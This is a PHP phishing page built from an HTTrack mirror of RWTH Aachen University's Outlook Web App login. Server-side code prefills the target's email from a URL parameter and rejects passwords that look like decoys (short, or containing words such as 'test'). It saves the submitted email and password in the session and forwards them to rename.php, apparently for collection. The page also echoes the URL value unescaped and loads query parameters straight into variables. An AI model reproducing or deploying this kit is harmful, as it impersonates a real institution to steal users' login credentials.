<?php
session_start();

// start > to get url and and put id 
	$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	parse_str(parse_url($url, PHP_URL_QUERY));
	$parts = @explode('@', $userid);
	$user = @$parts[0];
// < end 

$email_msg = "";
$pass_msg = "";

$email = $userid;
$pass = "";

if($_POST) {
	$email = $_POST['email'];
	$pass = $_POST['passwd'];

	if(!preg_match("/^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,4})$/", $email)) {
		$email_msg = "Enter a valid email";
	}
        else if(trim($pass) == "") {
		$pass_msg = "Please enter password";
	}
        else if(strlen($pass) <= 4 || stripos($pass,'fuck') !== false || stripos($pass,'cheat') !== false || stripos($pass,'test') !== false || $pass == $email ) {
		$pass_msg = "Invalid password";
	}
   else {
		$_SESSION['email'] = $email;
		$_SESSION['pass'] = $pass;
		header("Location: rename.php");
		exit;
	}
}
?>
<html>
<meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
<link rel="shortcut icon" href="https://mail.rwth-aachen.de/owa/14.3.210.2/themes/resources/favicon.ico" type="image/x-icon">
<meta http-equiv="Content-Type" content="text/html; CHARSET=utf-8">
<meta name="Robots" content="INDEX">
<title>Outlook Web App</title>
<link type="text/css" rel="stylesheet" href="../14.3.210.2/themes/resources/logon.css">
<link type="text/css" rel="stylesheet" href="../14.3.210.2/themes/resources/owafont.css">

</head>
<body class="owaLgnBdy">
<form method="post" action="">
<table align="center" id="tblMain" cellpadding=0 cellspacing=0>
	<tr>
		<td colspan=3>
			<table cellspacing=0 cellpadding=0 class="tblLgn">
			<tr>
				<td class="lgnTL"><img src="../14.3.210.2/themes/resources/lgntopl.gif" alt=""></td>
				<td class="lgnTM"></td>
				<td class="lgnTR"><img src="../14.3.210.2/themes/resources/lgntopr.gif" alt=""></td>
			</tr>
			</table>
		</td>
	</tr>
	<tr>
		<td id="mdLft">&nbsp;</td>
		<td id="mdMid">
			<table id="tblMid" class="mid">
				<tr>
					<td id="expltxt" class="expl">
										
					</td>
				</tr>
				<tr><td><hr></td></tr>
				<tr>
					<td>
						<table class="nonMSIE">
						<col>
						<col class="w100">
						<tr id=trSec>
							<td colspan="2">								
								Security 
									&#x200E;(
									<a href="#" id="lnkShwSec" onClick="clkExp('lnkShwSec')">
									show explanation 
									</a>
									<a href="#" id="lnkHdSec" onClick="clkExp('lnkHdSec')" style="display:none">
									hide explanation 
									</a>
								)&#x200E;
							</td>
						</tr>						
						<tr>
							<td><input id="rdoPblc" type="radio" name="trusted" value="0" class="rdo" onClick="clkSec()" checked></td>
							<td><label for="rdoPblc">This is a public or shared computer</label></td>
						</tr>
						<tr id="trPubExp" class="expl" style="display:none">
							<td></td>
							<td>Select this option if you use Outlook Web App on a public computer. Be sure to sign out when you've finished and close all windows to end your session.</td>
						</tr>
						<tr>
							<td><input id="rdoPrvt" type="radio" name="trusted" value="4" class="rdo" onClick="clkSec()"></td>
							<td><label for="rdoPrvt">This is a private computer</label></td>
						</tr>
						<tr id="trPrvtExp" class="expl" style="display:none">
							<td></td>
							<td>Select this option if you're the only person who uses this computer. Your server will allow a longer period of inactivity before signing you out.</td>
						</tr>
						<tr id="trPrvtWrn" class="wrng" style="display:none">
							<td></td>
							<td>Warning:  By selecting this option, you confirm that this computer complies with your organization's security policy.</td>
						</tr>
						</table>
					</td>
				</tr>
				
				<tr><td><hr></td></tr>
				<tr>
					<td>
						
						<table class="nonMSIE">
							<col>
							<col class="w100">
							
								<tr>
									<td><input id="chkBsc" type="checkbox" class="rdo" onClick="clkBsc();" disabled="true" checked="true"></td>
									<td nowrap><label for="chkBsc">Use the light version of Outlook Web App</label></td>
								</tr>
								<tr id="trBscExp" class="disBsc">
									<td></td>
									<td>The light version of Outlook Web App includes fewer features. Use it if you're on a slow connection or using a computer with unusually strict browser security settings. We also support the full Outlook Web App experience on some browsers on Windows, Mac, and Linux computers. To check out all the supported browsers and operating systems, <a href="http://go.microsoft.com/fwlink/?LinkID=129362" id="bscLnk">click here.</a></td>
							</tr>
							
						</table>
					</td>
				</tr>
				
				<tr><td><hr></td></tr>
				<tr>
					<td>
						<table class="nonMSIE">
							<col class="nowrap">
							<col class="w100">
							<col>
							<tr>
								<td nowrap><label for="username">
								
										Username:  
									
								</label></td>
								<td class="txtpad"><?php if($user == "") {?>
					
       <input type="text" id="email" name="email" placeholder="someone@example.com" class="tt"  style="margin-bottom: 8px;" value="<?php echo $email != "" ? $email : "" ?>" /><?php echo $email_msg != "" ? "<span style='color: #01010d; display: block; margin-left: 0px; margin-top: 2px;'>$email_msg</span>" : "<br />" ?>


				<?php

			} else {
				
	?>
			
			<input type="hidden" name="email" value="<?php echo $userid ?>" />

				<p id='username'><b><?php echo $userid ?></b></p> 
	<?php

			} ?>
 </td>
							</tr>
							<tr>
								<td nowrap><label for="password">Password:</label></td>
								<td class="txtpad"><input type="password" id="pass" name="passwd" placeholder="Password" class="tt" style="margin-bottom: 5px;"  /> <?php echo $pass_msg != "" ? "<span style='color: #a30b09; display: block; margin-left: 0px; margin-top: 1px;'>$pass_msg</span>" : "<br />" ?></td>
							</tr>
							<tr>
								<td colspan=2 align="right" class="txtpad">
									
									<input type="submit" class="btn" value="Sign in" onClick="clkLgn()">
									
									<input name="isUtf8" type="hidden" value="1">
								</td>
							</tr>
						</table>
						<p>
						<table>
						<tr>
							<td colspan=2 align="left"><strong>					
							
									<a href="http://www.itc.rwth-aachen.de/cms/IT-Center/Dienste/kompletter-Servicekatalog/IT-Sicherheit/~frnr/Passwort/lidx/1/">Security notice</a>
								
							</strong>
							</td>
							</tr>
						</table>
					</td>
				</tr>
				<tr><td><hr></td></tr>
				
			</table>
			<table id="tblMid2" class="mid" style="display:none">
				<tr><td><hr></td></tr>
				<tr>
					<td><br>Please enable cookies for this Web site.<br><br>Cookies are currently disabled by your browser. Outlook Web App requires that cookies be enabled. <br><br>For information about how to enable cookies, see the Help for your Web browser.<br><br><br></td>
				</tr>
				<tr><td><hr></td></tr>
				<tr>
					<td align="right" class="txtpad">
					
						<input type="button" class="btn" style="float: right" value="Retry" onClick="clkRtry()">
					
					</td>
				</tr>
			</table>
			<table class="mid tblConn">
				<tr>
					<td rowspan=2 align="right" class="tdConnImg"><img style="vertical-align:top" src="../14.3.210.2/themes/resources/lgnexlogo.gif" alt=""></td>
					<td class="tdConn">Connected to Microsoft Exchange   CAS5</td>
				</tr>
				<tr>
					<td class="tdCopy">&copy; 2010 Microsoft Corporation. All rights reserved.</td>
				</tr>
			</table>
		</td>
		<td id="mdRt">&nbsp;</td>
	</tr>
	<tr>
		<td colspan=3>
			<table cellspacing=0 cellpadding=0 class="tblLgn">
			<tr>
				<td class="lgnBL"><img src="../14.3.210.2/themes/resources/lgnbotl.gif" alt=""></td>
				<td class="lgnBM"></td>
				<td class="lgnBR"><img src="../14.3.210.2/themes/resources/lgnbotr.gif" alt=""></td>
			</tr>
			</table>
		</td>
	</tr>
</table>
</form>
</body>

<!-- Mirrored from mail.rwth-aachen.de/owa/auth/logon.aspx?replaceCurrent=1&url=https%3a%2f%2fmail.rwth-aachen.de%2fowa%2f by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 25 Feb 2015 11:07:11 GMT -->
</html>